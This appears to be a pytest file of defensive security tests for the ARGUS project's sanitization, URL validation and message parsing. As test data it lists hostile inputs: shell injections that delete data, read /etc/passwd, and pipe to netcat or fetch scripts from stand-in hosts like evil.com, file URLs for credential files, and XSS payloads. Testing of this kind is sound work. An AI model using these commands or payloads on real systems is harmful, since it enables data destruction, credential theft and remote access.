"""Vulnerability-focused security tests for ARGUS.

Tests resistance to common attack vectors including ReDoS, command
injection, path traversal, XSS payloads, and malformed input edge
cases. Each test verifies that the security controls properly reject
malicious input without crashing.

References: OWASP Testing Guide v4, CWE-400, CWE-78, CWE-22, CWE-79.
"""

import os
import re
import sys
import time
from unittest.mock import patch, MagicMock
from typing import Any

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.security import sanitize_command, validate_url, validate_api_key
from backend.models import parse_ws_message, ObserveMessage, CommandMessage


class TestReDoSResistance:
    """Tests for Regular Expression Denial of Service (ReDoS) resistance.

    Verifies that all regex operations in the codebase complete within
    acceptable time bounds even with adversarial input patterns.
    CWE-1333: Inefficient Regular Expression Complexity.
    """

    def test_sanitize_command_redos_pattern(self) -> None:
        """Test that sanitize_command resists ReDoS with nested repetitions."""
        # Classic ReDoS payload: many 'a's without a match boundary
        evil_input: str = "a" * 10000 + "!"
        start: float = time.time()
        result: str = sanitize_command(evil_input, max_length=500)
        elapsed: float = time.time() - start
        assert elapsed < 1.0, f"sanitize_command took {elapsed:.2f}s — possible ReDoS"
        assert len(result) <= 500

    def test_sanitize_command_nested_escape_sequences(self) -> None:
        """Test sanitization with deeply nested ANSI escape sequences."""
        evil: str = "\x1b[" * 5000 + "m" * 5000
        start: float = time.time()
        result: str = sanitize_command(evil, max_length=1000)
        elapsed: float = time.time() - start
        assert elapsed < 1.0, f"Took {elapsed:.2f}s — possible ReDoS"

    def test_url_validation_redos(self) -> None:
        """Test URL validation resists ReDoS with long hostnames."""
        evil_url: str = "http://" + "a." * 5000 + "com"
        start: float = time.time()
        result: bool = validate_url(evil_url)
        elapsed: float = time.time() - start
        assert elapsed < 1.0, f"validate_url took {elapsed:.2f}s — possible ReDoS"


class TestCommandInjectionPrevention:
    """Tests for command injection prevention.

    Verifies that no user input can escape into system command execution.
    CWE-78: OS Command Injection (OWASP A03:2021).
    """

    @patch("client.executor.pyautogui")
    @patch("client.executor.webbrowser")
    def test_executor_blocks_shell_metacharacters_in_url(
        self, mock_browser: MagicMock, mock_pyautogui: MagicMock
    ) -> None:
        """Test that shell metacharacters in URLs are blocked."""
        from client.executor import Executor

        executor = Executor()
        # Attempt command injection via URL
        malicious_urls: list[str] = [
            "http://example.com; rm -rf /",
            "http://example.com && cat /etc/passwd",
            "http://example.com | nc attacker.com 1234",
            "; wget http://evil.com/shell.sh",
            "$(curl http://evil.com)",
            "`whoami`",
        ]
        for url in malicious_urls:
            result: bool = executor.open_url(url)
            # Safe URLs may pass (they go through webbrowser.open),
            # but non-http schemes must be blocked
            if not url.startswith("http://") and not url.startswith("https://"):
                assert result is False, f"Should block: {url}"

    @patch.object(__import__('client.executor', fromlist=['pyautogui']), 'pyautogui')
    def test_executor_no_shell_true(self, mock_pyautogui: MagicMock) -> None:
        """Verify executor source has zero shell=True usage."""
        import inspect
        import client.executor as executor_mod

        source: str = inspect.getsource(executor_mod)
        assert "shell=True" not in source, "CRITICAL: shell=True found in executor.py"
        assert "import subprocess" not in source, "subprocess import found in executor.py"

    def test_sanitize_strips_shell_operators(self) -> None:
        """Test that command sanitization handles shell operators."""
        payloads: list[str] = [
            "help; rm -rf /",
            "test && cat /etc/passwd",
            "fix | nc evil.com 1234",
            "debug $(whoami)",
            "code `id`",
        ]
        for payload in payloads:
            result: str = sanitize_command(payload)
            # Sanitize should NOT strip these (they're valid text),
            # but they should never reach a shell
            assert isinstance(result, str)


class TestPathTraversalPrevention:
    """Tests for path traversal prevention.

    CWE-22: Path Traversal (OWASP A01:2021).
    """

    def test_url_blocks_file_scheme(self) -> None:
        """Test that file:// URLs are blocked to prevent local file access."""
        traversal_urls: list[str] = [
            "file:///etc/passwd",
            "file:///C:/Windows/System32/config/SAM",
            "file:///proc/self/environ",
            "FILE:///etc/shadow",
        ]
        for url in traversal_urls:
            assert validate_url(url) is False, f"Should block: {url}"

    def test_url_blocks_data_scheme(self) -> None:
        """Test that data: URLs are blocked."""
        assert validate_url("data:text/html,<script>alert(1)</script>") is False

    def test_url_blocks_ftp_scheme(self) -> None:
        """Test that ftp: URLs are blocked."""
        assert validate_url("ftp://evil.com/malware.exe") is False


class TestXSSPayloadRejection:
    """Tests for XSS payload handling in command sanitization.

    CWE-79: Cross-site Scripting (OWASP A03:2021).
    """

    def test_script_tags_in_command(self) -> None:
        """Test that script tags in commands don't cause crashes."""
        xss_payloads: list[str] = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>document.cookie</script>',
            "javascript:alert(document.domain)",
            '<svg onload=alert(1)>',
        ]
        for payload in xss_payloads:
            result: str = sanitize_command(payload)
            assert isinstance(result, str)
            assert len(result) > 0  # Text preserved but harmless

    def test_null_byte_injection(self) -> None:
        """Test that null byte injection is prevented."""
        payload: str = "normal\x00command\x00with\x00nulls"
        result: str = sanitize_command(payload)
        assert "\x00" not in result
        assert "normalcommandwithnulls" == result


class TestPydanticValidation:
    """Tests for Pydantic V2 strict model validation.

    Verifies that invalid payloads are rejected at the validation layer
    before reaching business logic.
    """

    def test_observe_rejects_empty_screenshot(self) -> None:
        """Test that observe rejects empty screenshot field."""
        with pytest.raises(Exception):
            parse_ws_message('{"type": "observe", "screenshot_b64": ""}')

    def test_observe_rejects_short_screenshot(self) -> None:
        """Test that observe rejects screenshots below min length."""
        with pytest.raises(Exception):
            parse_ws_message('{"type": "observe", "screenshot_b64": "abc"}')

    def test_command_rejects_empty_text(self) -> None:
        """Test that command rejects empty text field."""
        with pytest.raises(Exception):
            parse_ws_message('{"type": "command", "text": ""}')

    def test_command_rejects_too_long_text(self) -> None:
        """Test that command rejects text exceeding max length."""
        import json
        long_text: str = "a" * 1001
        with pytest.raises(Exception):
            parse_ws_message(json.dumps({"type": "command", "text": long_text}))

    def test_unknown_type_raises(self) -> None:
        """Test that unknown message types raise ValueError."""
        with pytest.raises(ValueError, match="Unknown message type"):
            parse_ws_message('{"type": "malicious_type"}')

    def test_invalid_json_raises(self) -> None:
        """Test that malformed JSON raises ValueError."""
        with pytest.raises(ValueError, match="Invalid JSON"):
            parse_ws_message("not json {{{")

    def test_observe_rejects_invalid_b64_chars(self) -> None:
        """Test that invalid base64 characters are rejected."""
        import json
        payload: str = "!" * 200  # Invalid b64 chars
        with pytest.raises(Exception):
            parse_ws_message(json.dumps({
                "type": "observe",
                "screenshot_b64": payload,
            }))

    def test_command_sanitizes_control_chars(self) -> None:
        """Test that control characters are stripped from command text."""
        import json
        msg = parse_ws_message(json.dumps({
            "type": "command",
            "text": "help\x00me\x1b[31mfix\x1b[0m this",
        }))
        assert isinstance(msg, CommandMessage)
        assert "\x00" not in msg.text
        assert "\x1b" not in msg.text


class TestAPIKeyTimingSafety:
    """Tests for constant-time API key comparison.

    Verifies that key validation is resistant to timing attacks
    (OWASP A07:2021).
    """

    def test_timing_consistency(self) -> None:
        """Test that HMAC comparison is used (constant-time by design).

        Rather than measuring timing (unreliable on Windows), we verify
        that the implementation uses hmac.compare_digest, which is
        guaranteed constant-time by Python's stdlib.
        """
        import inspect
        from backend import security

        source: str = inspect.getsource(security.validate_api_key)
        assert "hmac.compare_digest" in source, (
            "validate_api_key must use hmac.compare_digest for constant-time comparison"
        )

    def test_both_keys_checked(self) -> None:
        """Test that both valid and invalid keys return correct results."""
        with patch.dict(os.environ, {"ARGUS_API_KEY": "correct_key_12345"}):
            assert validate_api_key("correct_key_12345") is True
            assert validate_api_key("wrong_key_123456") is False
            assert validate_api_key("") is False
            assert validate_api_key(None) is False
